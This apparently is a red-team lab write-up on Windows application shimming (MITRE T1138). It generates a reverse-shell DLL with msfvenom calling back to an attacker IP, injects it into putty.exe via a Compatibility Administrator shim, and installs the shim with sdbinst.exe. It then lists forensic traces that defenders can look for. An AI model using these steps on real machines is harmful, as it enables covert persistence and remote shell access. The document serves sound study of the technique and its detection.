---
description: Persistence, Privilege Escalation
---

# Application Shimming

## Application Shimming

### Execution

In this lab, [Compatibility Administrator](https://www.microsoft.com/en-us/download/details.aspx?id=7352) will be abused to inject a malicious payload into putty.exe process, which will connect back to our attacking machine.

Generating malicious payload stored in a 32-bit DLL:

{% code title="attacker\@kali" %}
```csharp
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil32.dll
```
{% endcode %}

Creating a shim fix for putty.exe - this is the "fix" that will get our malicious DLL injected into putty.exe when it is launched next time:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LI7vOe8-hPSfy8UjXsr%2F-LI7rNyL1L5BvT4eEe3r%2Fshim-new-fix.png?alt=media\&token=c7463ba5-9a9f-4928-8a1c-0f77800a3d64)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LI7vOe8-hPSfy8UjXsr%2F-LI7rwXv-p2eQs_I1RH2%2Fshim-injectdll.png?alt=media\&token=b72545f0-383b-40d0-85a5-6d759f14b670)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LI7vOe8-hPSfy8UjXsr%2F-LI7rzFatxXYnzZNvW76%2Fshim-cmdline.png?alt=media\&token=6d210771-2256-4927-b90b-6c49875b1fa9)

Installing the shim fixes database we created earlier onto the victim machine using a native windows utility:

{% code title="attacker\@victim" %}
```csharp
sdbinst.exe C:\experiments\mantvydas.sdb
```
{% endcode %}

Launching putty.exe on the victim machine, sends us our reverse shell - DLL injection worked:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LI7vOe8-hPSfy8UjXsr%2F-LI7scHYnhI4hU-uLTKQ%2Fshim-shell.png?alt=media\&token=43dd2e0f-8281-470e-8775-06decc30e914)

### Observations

We can see putty.exe has loaded the evil32.dll:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LI7vOe8-hPSfy8UjXsr%2F-LI7uENOOeU36bIC4bx-%2Fputty-evil32.png?alt=media\&token=8d10b336-e3de-4cbb-b14a-89a013219e74)

Note, however, immediately after executing the payload, evil32.dll cannot be observed in the loaded system DLLs:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LI7vOe8-hPSfy8UjXsr%2F-LI7sz6zM1tcopjQdndV%2Fshim-rundll32.png?alt=media\&token=39d12fc6-44a1-40ae-9500-61c64b669219)

The sdbinst.exe leaves the following behind:

* fix name "mantvydas" (we set it in the first step of the shim fix creation) in the "Installed applications" list
* the fix db itself gets copied over to `%WINDIR%\AppPatch\custom OR %WINDIR%\AppPatch\AppPatch64\Custom`
* registry key pointing to the custom fixes db gets added

All of the above can be seen here:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LI7xRrY3XjmCB9jEwsz%2F-LI7zyLEYKqWu_z9mz4O%2Fshim-remnants.png?alt=media\&token=4cf27f87-e634-45c8-a67d-78d425273505)

Note that it is possible to install the shim fixes manually without leaving the trace in the "Installed applications" list, however the fixes db will still have to be written to the disk and the registry will have to be modified:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LI8Cvs09bAnmUXqP3TC%2F-LI8D49Y-KGgWpXGH_gg%2Fshim-sysmon.png?alt=media\&token=4f01fd16-fb9d-4680-866c-64bab042225e)

Correlate it with other events exhibited by the application that has been fixed and you may see something you might want to investigate further:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LI8EBKAoJEcEoRx_Byg%2F-LI8E8LGIlCFDIZfNE6X%2Fshim-connection.png?alt=media\&token=b2f5381e-2b65-460e-8c6b-da624b801c50)

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1138" %}

{% embed url="https://blacksunhackers.club/2016/08/post-exploitation-persistence-with-application-shims-intro/" %}
